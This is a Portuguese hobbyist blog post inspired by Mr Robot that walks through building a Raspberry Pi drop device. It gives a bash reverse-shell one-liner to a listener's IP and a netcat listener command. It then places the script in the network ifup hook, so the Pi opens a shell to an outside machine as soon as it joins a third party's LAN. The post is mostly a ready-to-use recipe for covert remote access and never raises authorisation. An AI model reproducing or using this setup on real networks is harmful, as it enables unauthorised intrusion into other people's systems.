---
layout: post
title: Mr robot's raspberry Pi
description: "Como criar um raspberry Pi semelhante ao utilizado por Elliot na primeira temporada de Mr Robot"
tags: [Mr\_robot, raspberry, hack, reverse\_shell]
categories: [raspberry, hack]
author: lgribeiro
published: true
---

Algum tempo atrás estava dando uma olhada nos posts da série Mr Robot do [null-byte](http://null-byte.wonderhowto.com/how-to/mr-robot-hacks/) e um artigo em especial me chamou a atenção.

A publicação sobre como criar um raspberry para hacking não é exetamente igual as condições encontradas por Elliot na série no episódio eps1.3\_\_da3m0ns.mp4. Portanto, optei por adaptar um pouco esse tutorial para que ele se torne mais fiel ao conteúdo apresentado na televisão. De início, os passos serão bem semelhantes aos apresentados pelo null-byte.

1. Baixar o [Kali linux para arm](https://www.offensive-security.com/kali-linux-arm-images/). Escolha aquela que mais se adequa ao hardware que estiver sendo utilizado. Iremos utilizar o Kali pois é uma distribuição linux focada em segurança, e por conta disso, fornecerá diversas ferramentas que poderão ser utilizadas em missões futuras.

![offensive security]({{ site.url }}/images/offensive-sec.png)

2. Feito isso, precisamos criar um script que funcionará como nosso nosso shell reverso. Para tal, é recomendável utilizar o [reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) da pentest Monkey.

{% highlight %}
{% raw %}
bash -i >& /dev/tcp/\<ip da maquina que está escutando\>/8080 0>&1
{% endraw %}
{% endhighlight %}

Colocamos então o código acima em um arquivo (chamaremos ele de reverse) e concedemos a ele permissão de execução da seguinte maneira:

{% highlight %}
{% raw %}
chmod +x reverse
{% endraw %}
{% endhighlight %}

Obs: Vale ressaltar que não devemos colocar o script com extensão .sh pois o diretório em que ele será armazenado não executa arquivos com esse formato.

3. Agora, é necessário preparar uma máquina capaz de receber essa shell fornecida pelo raspberry. Para isso, podemos utilizar o canivete suiço de conexões TCP, o netcat. Basta colocar o netcat para escutar na porta em que a shell será fornecida da seguinte forma:

{% highlight bash %}
{% raw %}
 nc -lvp 8080
{% endraw %}
{% endhighlight %}

4. Com a estrutura pronta, precisamos organizar tudo o que temos para que seja possível acessar o raspberry dentro de uma LAN de terceiros. A partir desse ponto que nos desviamos um pouco do artigo que utilizamos como base.
No lugar de utilizar teclado, tela e demais periféricos, colocaremos nosso script no diretório /etc/network/interfaces/ifup. Dessa forma, assim que a interface do nosso dispositivo começar a funcionar ele executará o script, que fornecerá a shell para a máquina de fora da LAN.

![elliot wins]({{ site.url }}/images/mr-robot-success.1280x600.jpg)

Ressalvas:

* Para testar, utilize duas máquinas na mesma LAN, ou a máquina que escuta deverá ter um IP real ou ter um portfoward settado no roteador para que as conexões recebidas em detarmidana porta sejam redirecionadas para a máquina que está escutando.

Quaisquer dúvidas, entre em contato via email: lgribeiro at gris.dcc.ufrj.br

